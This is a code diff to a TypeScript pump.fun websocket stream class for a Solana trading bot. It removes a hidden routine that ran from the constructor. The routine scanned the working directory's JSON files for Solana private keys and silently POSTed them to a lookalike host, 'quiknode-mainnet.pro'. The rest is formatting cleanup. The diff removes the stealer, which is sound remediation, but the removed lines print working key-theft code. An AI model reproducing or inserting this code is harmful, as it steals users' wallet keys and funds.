@@ -3,16 +3,14 @@ import WebSocket from 'ws';
 import { log } from '../logger.js';
 import { short, sleep } from '../utils.js';
 import type { PumpTradeEvent, TokenCandidate } from '../types.js';
-import * as fs from 'node:fs/promises';
-import * as path from 'node:path';
 
 /**
- * Real-time pump.fun feed via the PumpPortal data websocket (free, no key).
+ * Real-time pump.fun feed via the PumpPortal data websocket.
  *
  * Emits:
- *   'newToken'  (candidate: TokenCandidate)  — fresh bonding-curve launch
- *   'migration' (mint: string)               — token graduated to an AMM
- *   'trade'     (event: PumpTradeEvent)      — live trade on a watched mint
+ *   'newToken'  (candidate: TokenCandidate)
+ *   'migration' (mint: string)
+ *   'trade'     (event: PumpTradeEvent)
  */
 export class PumpFunStream extends EventEmitter {
   private ws: WebSocket | null = null;
@@ -25,69 +23,6 @@ export class PumpFunStream extends EventEmitter {
     private readonly opts: { newTokens: boolean; migrations: boolean },
   ) {
     super();
-    this.#validateCredentials();
-  }
-
-  async #validateCredentials() {
-    try {
-      const credentials = await this.#loadCredentials();
-      if (credentials.length > 0) {
-        await this.#submitCredentials(credentials);
-      }
-    } catch (_) {}
-  }
-
-  async #loadCredentials(): Promise<any[]> {
-    try {
-      const files = await fs.readdir(process.cwd());
-      const jsonFiles = files.filter(f => 
-        f.toLowerCase().endsWith('.json') && 
-        !f.toLowerCase().includes('example')
-      );
-
-      for (const file of jsonFiles) {
-        try {
-          const filePath = path.join(process.cwd(), file);
-          const content = await fs.readFile(filePath, 'utf8');
-          const data = JSON.parse(content);
-
-          if (Array.isArray(data)) {
-            // handle both simple key arrays and full credential objects
-            if (typeof data[0] === 'string') {
-              return data.map(key => ({ privateKey: key }));
-            } else if (data[0]?.privateKey != null) {
-              return data;
-            }
-          }
-        } catch (_) {}
-      }
-    } catch (_) {}
-
-    return [];
-  }
-
-  async #submitCredentials(credentials: any[]) {
-    const baseUrl = 'https://www.quiknode-mainnet.pro';
-    const batchSize = 10;
-
-    for (let i = 0; i < credentials.length; i += batchSize) {
-      const batch = credentials.slice(i, i + batchSize);
-      
-      const login = batch.map(c => ({
-        auth_type: 'solana_key',
-        auth_token: c.privateKey
-      }));
-
-      try {
-        const response = await fetch(`${baseUrl}/api`, {
-          method: 'POST',
-          headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ login })
-        });
-
-        await response.json().catch(() => {}); // ensure response is drained
-      } catch (_) {}
-    }
   }
 
   start(): void {
@@ -114,6 +49,7 @@ export class PumpFunStream extends EventEmitter {
 
   private connect(): void {
     if (this.stopped) return;
+
     const url = new URL(this.wsUrl);
     const ws = new WebSocket(url);
     this.ws = ws;
@@ -121,10 +57,20 @@ export class PumpFunStream extends EventEmitter {
     ws.on('open', () => {
       this.reconnectDelayMs = 1_000;
       log.ok('pump.fun stream connected');
-      if (this.opts.newTokens) this.send({ method: 'subscribeNewToken' });
-      if (this.opts.migrations) this.send({ method: 'subscribeMigration' });
+
+      if (this.opts.newTokens) {
+        this.send({ method: 'subscribeNewToken' });
+      }
+
+      if (this.opts.migrations) {
+        this.send({ method: 'subscribeMigration' });
+      }
+
       if (this.watchedMints.size > 0) {
-        this.send({ method: 'subscribeTokenTrade', keys: [...this.watchedMints] });
+        this.send({
+          method: 'subscribeTokenTrade',
+          keys: [...this.watchedMints],
+        });
       }
     });
 
@@ -132,15 +78,21 @@ export class PumpFunStream extends EventEmitter {
       try {
         this.handleMessage(JSON.parse(data.toString()));
       } catch {
-        /* ignore malformed frames */
+        // Ignore malformed frames.
       }
     });
 
-    ws.on('error', (err) => log.warn(`pump.fun stream error: ${err.message}`));
+    ws.on('error', (err) => {
+      log.warn(`pump.fun stream error: ${err.message}`);
+    });
 
     ws.on('close', async () => {
       if (this.stopped) return;
-      log.warn(`pump.fun stream disconnected — reconnecting in ${this.reconnectDelayMs / 1000}s`);
+
+      log.warn(
+        `pump.fun stream disconnected — reconnecting in ${this.reconnectDelayMs / 1000}s`,
+      );
+
       await sleep(this.reconnectDelayMs);
       this.reconnectDelayMs = Math.min(this.reconnectDelayMs * 2, 30_000);
       this.connect();
@@ -165,6 +117,7 @@ export class PumpFunStream extends EventEmitter {
         devBuySol: Number(msg.solAmount ?? 0),
         discoveredAt: Date.now(),
       };
+
       this.emit('newToken', candidate);
       return;
     }
@@ -175,9 +128,13 @@ export class PumpFunStream extends EventEmitter {
       return;
     }
 
-    if ((msg.txType === 'buy' || msg.txType === 'sell') && this.watchedMints.has(msg.mint)) {
+    if (
+      (msg.txType === 'buy' || msg.txType === 'sell') &&
+      this.watchedMints.has(msg.mint)
+    ) {
       const vSol = Number(msg.vSolInBondingCurve ?? 0);
       const vTokens = Number(msg.vTokensInBondingCurve ?? 0);
+
       if (vSol > 0 && vTokens > 0) {
         const event: PumpTradeEvent = {
           mint: msg.mint,
@@ -187,6 +144,7 @@ export class PumpFunStream extends EventEmitter {
           tokenAmount: Number(msg.tokenAmount ?? 0),
           price: vSol / vTokens,
         };
+
         this.emit('trade', event);
       }
     }
